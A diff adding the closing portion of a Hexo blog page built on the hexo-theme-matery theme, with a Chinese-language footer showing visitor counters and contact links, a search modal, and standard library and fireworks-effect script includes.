+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">111.2k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input" autofocus="">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
